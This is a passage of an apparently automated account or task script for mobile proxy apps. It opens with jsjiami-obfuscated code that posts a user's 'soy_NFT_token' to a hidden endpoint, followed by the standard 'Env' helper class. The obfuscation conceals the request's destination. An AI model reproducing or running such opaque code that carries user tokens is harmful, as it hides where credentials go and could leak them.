Promise((_0x1e9918,_0x41f78b)=>{$[_0x37d2('3f')]({'\x75\x72\x6c':_0x37d2('70'),'\x68\x65\x61\x64\x65\x72\x73':{'token':soy_NFT_token,'Content-Type':_0x37d2('71'),'Host':_0x37d2('41'),'Connection':_0x37d2('42'),'Accept-Encoding':_0x37d2('43'),'User-Agent':_0x37d2('44')},'\x62\x6f\x64\x79':_0x37d2('72')+NFT+_0x37d2('73')},async(_0x3af971,_0x5ed5b4,_0x3a68b7)=>{try{let _0x36ff0f=JSON[_0x37d2('25')](_0x3a68b7);if(_0x36ff0f[_0x37d2('47')]==0xc8){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('74')+_0x36ff0f[_0x37d2('5d')]);subTitle+='\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('74')+_0x36ff0f[_0x37d2('5d')];}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('74')+_0x36ff0f[_0x37d2('5d')]);subTitle+='\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('74')+_0x36ff0f[_0x37d2('5d')];}}catch(_0xa432cb){console[_0x37d2('4')](_0xa432cb,_0x5ed5b4);}finally{_0x1e9918();}});});}function Base64(){_keyStr=_0x37d2('75');this[_0x37d2('2e')]=function(_0x4c811d){var _0x26aa12='';var _0x84c529,_0x305fed,_0x5e1d61,_0x919919,_0x137f44,_0x4a25e1,_0x5eba9b;var _0x45f2fb=0x0;_0x4c811d=_utf8_encode(_0x4c811d);while(_0x45f2fb<_0x4c811d[_0x37d2('11')]){_0x84c529=_0x4c811d[_0x37d2('76')](_0x45f2fb++);_0x305fed=_0x4c811d[_0x37d2('76')](_0x45f2fb++);_0x5e1d61=_0x4c811d[_0x37d2('76')](_0x45f2fb++);_0x919919=_0x84c529>>0x2;_0x137f44=(_0x84c529&0x3)<<0x4|_0x305fed>>0x4;_0x4a25e1=(_0x305fed&0xf)<<0x2|_0x5e1d61>>0x6;_0x5eba9b=_0x5e1d61&0x3f;if(isNaN(_0x305fed)){_0x4a25e1=_0x5eba9b=0x40;}else if(isNaN(_0x5e1d61)){_0x5eba9b=0x40;}_0x26aa12=_0x26aa12+_keyStr[_0x37d2('77')](_0x919919)+_keyStr[_0x37d2('77')](_0x137f44)+_keyStr[_0x37d2('77')](_0x4a25e1)+_keyStr[_0x37d2('77')](_0x5eba9b);}return _0x26aa12;};this[_0x37d2('78')]=function(_0x25badd){var _0x8979de='';var _0x1d31f5,_0x3e3458,_0x4ae814;var _0x4af4aa,_0x52bf27,_0x1c9ef6,_0x12c3da;var _0x31723a=0x0;_0x25badd=_0x25badd[_0x37d2('79')](/[^A-Za-z0-9\+\/\=]/g,'');while(_0x31723a<_0x25badd[_0x37d2('11')]){_0x4af4aa=_keyStr[_0x37d2('7')](_0x25badd[_0x37d2('77')](_0x31723a++));_0x52bf27=_keyStr[_0x37d2('7')](_0x25badd[_0x37d2('77')](_0x31723a++));_0x1c9ef6=_keyStr[_0x37d2('7')](_0x25badd[_0x37d2('77')](_0x31723a++));_0x12c3da=_keyStr[_0x37d2('7')](_0x25badd[_0x37d2('77')](_0x31723a++));_0x1d31f5=_0x4af4aa<<0x2|_0x52bf27>>0x4;_0x3e3458=(_0x52bf27&0xf)<<0x4|_0x1c9ef6>>0x2;_0x4ae814=(_0x1c9ef6&0x3)<<0x6|_0x12c3da;_0x8979de=_0x8979de+String[_0x37d2('7a')](_0x1d31f5);if(_0x1c9ef6!=0x40){_0x8979de=_0x8979de+String[_0x37d2('7a')](_0x3e3458);}if(_0x12c3da!=0x40){_0x8979de=_0x8979de+String[_0x37d2('7a')](_0x4ae814);}}_0x8979de=_utf8_decode(_0x8979de);return _0x8979de;};_utf8_encode=function(_0x37929f){_0x37929f=_0x37929f[_0x37d2('79')](/\r\n/g,'\x0a');var _0x309abf='';for(var _0x2ae57a=0x0;_0x2ae57a<_0x37929f[_0x37d2('11')];_0x2ae57a++){var _0x477bcd=_0x37929f[_0x37d2('76')](_0x2ae57a);if(_0x477bcd<0x80){_0x309abf+=String[_0x37d2('7a')](_0x477bcd);}else if(_0x477bcd>0x7f&&_0x477bcd<0x800){_0x309abf+=String[_0x37d2('7a')](_0x477bcd>>0x6|0xc0);_0x309abf+=String[_0x37d2('7a')](_0x477bcd&0x3f|0x80);}else{_0x309abf+=String[_0x37d2('7a')](_0x477bcd>>0xc|0xe0);_0x309abf+=String[_0x37d2('7a')](_0x477bcd>>0x6&0x3f|0x80);_0x309abf+=String[_0x37d2('7a')](_0x477bcd&0x3f|0x80);}}return _0x309abf;};_utf8_decode=function(_0x40d3f1){var _0x29f5e9='';var _0x1d5738=0x0;var _0x540def=c1=c2=0x0;while(_0x1d5738<_0x40d3f1[_0x37d2('11')]){_0x540def=_0x40d3f1[_0x37d2('76')](_0x1d5738);if(_0x540def<0x80){_0x29f5e9+=String[_0x37d2('7a')](_0x540def);_0x1d5738++;}else if(_0x540def>0xbf&&_0x540def<0xe0){c2=_0x40d3f1[_0x37d2('76')](_0x1d5738+0x1);_0x29f5e9+=String[_0x37d2('7a')]((_0x540def&0x1f)<<0x6|c2&0x3f);_0x1d5738+=0x2;}else{c2=_0x40d3f1[_0x37d2('76')](_0x1d5738+0x1);c3=_0x40d3f1[_0x37d2('76')](_0x1d5738+0x2);_0x29f5e9+=String[_0x37d2('7a')]((_0x540def&0xf)<<0xc|(c2&0x3f)<<0x6|c3&0x3f);_0x1d5738+=0x3;}}return _0x29f5e9;};};_0xodb='jsjiami.com.v6';


function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      return "POST" === e && (s = this.post), new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s)
        })
      })
    }
    get(t) {
      return this.send.call(this.env, t)
    }
    post(t) {
      return this.send.call(this.env, t, "POST")
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `\ud83d\udd14${this.name}, \u5f00\u59cb!`)
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports
    }
    isQuanX() {
      return "undefined" != typeof $task
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon
    }
    isLoon() {
      return "undefined" != typeof $loon
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t)
      } catch {
        return e
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t)
      } catch {
        return e
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) try {
        s = JSON.parse(this.getdata(t))
      } catch {}
      return s
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e)
      } catch {
        return !1
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i))
      })
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"), a = {
          url: `http://${h}/v1/scripting/evaluate`,
          body: {
            script_text: t,
            mock_type: "cron",
            timeout: r
          },
          headers: {
            "X-Key": o,
            Accept: "*/*"
          }
        };
        this.post(a, (t, e, i) => s(i))
      }).catch(t => this.logErr(t))
    }
    loaddata() {
      if (!this.isNode()) return {}; {
        this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) return {}; {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i))
          } catch (t) {
            return {}
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i)
        if (r = Object(r)[t], void 0 === r) return s;
      return r
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
        if (r) try {
          const t = JSON.parse(r);
          e = t ? this.lodash_get(t, i, "") : e
        } catch (t) {
          e = ""
        }
      }
      return e
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
        }
      } else s = this.setval(t, e);
      return s
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
    }
    get(t, e = (() => {})) {
      t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
        "X-Surge-Skip-Scripting": !1
      })), $httpClient.get(t, (t, s, i) => {
        !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
      })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
        hints: !1
      })), $task.fetch(t).then(t => {
        const {
          statusCode: s,
          statusCode: i,
          headers: r,
          body: o
        } = t;
        e(null, {
          status: s,
          statusCode: i,
          headers: r,
          body: o
        }, o)
      }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
        try {
          if (t.headers["set-cookie"]) {
            const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
            this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
          }
        } catch (t) {
          this.logErr(t)
        }
      }).then(t => {
        const {
          statusCode: s,
          statusCode: i,
          headers: r,
          body: o
        } = t;
        e(null, {
          status: s,
          statusCode: i,
          headers: r,
          body: o
        }, o)
      }, t => {
        const {
          message: s,
          response: i
        } = t;
        e(s, i, i && i.body)
      }))
    }
    post(t, e = (() => {})) {
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
        "X-Surge-Skip-Scripting": !1
      })), $httpClient.post(t, (t, s, i) => {
        !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
      });
      else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
        hints: !1
      })), $task.fetch(t).then(t => {
        const {
          statusCode: s,
          statusCode: i,
          headers: r,
          body: o
        } = t;
        e(null, {
          status: s,
          statusCode: i,
          headers: r,
          body: o
        }, o)
      }, t => e(t));
      else if (this.isNode()) {
        this.initGotEnv(t);
        const {
          url: s,
          ...i
        } = t;
        this.got.post(s, i).then(t => {
          const {
            statusCode: s,
            statusCode: i,
            headers: r,
            body: o
          } = t;
          e(null, {
            status: s,
            statusCode: i,
            headers: r,
            body: o
          }, o)
        }, t => {
          const {
            message: s,
            response: i
          } = t;
          e(s, i, i && i.body)
        })
      }
    }
    time(t) {
      let e = {
        "M+": (new Date).getMonth() + 1,
        "d+": (new Date).getDate(),
        "H+": (new Date).getHours(),
        "m+": (new Date).getMinutes(),
        "s+": (new Date).getSeconds(),
        "q+": Math.floor(((new Date).getMonth() + 3) / 3),
        S: (new Date).getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, ((new Date).getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let s in e) new RegExp("(" + s + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? e[s] : ("00" + e[s]).substr(("" + e[s]).length)));
      return t
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) return t;
        if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {
          "open-url": t
        } : this.isSurge() ? {
          url: t
        } : void 0;
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            }
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            }
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            }
          }
        }
      };
      this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r)));
      let h = ["", "==============\ud83d\udce3\u7cfb\u7edf\u901a\u77e5\ud83d\udce3=============="];
      h.push(e), s && h.push(s), i && h.push(i), console.log(h.join("\n")), this.logs = this.logs.concat(h)
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `\u2757\ufe0f${this.name}, \u9519\u8bef!`, t.stack) : this.log("", `\u2757\ufe0f${this.name}, \u9519\u8bef!`, t)
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t))
    }
    done(t = {}) {
      const e = (new Date).getTime(),
        s = (e - this.startTime) / 1e3;
      this.log("", `\ud83d\udd14${this.name}, \u7ed3\u675f! \ud83d\udd5b ${s} \u79d2`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
    }
  }(t, e)
}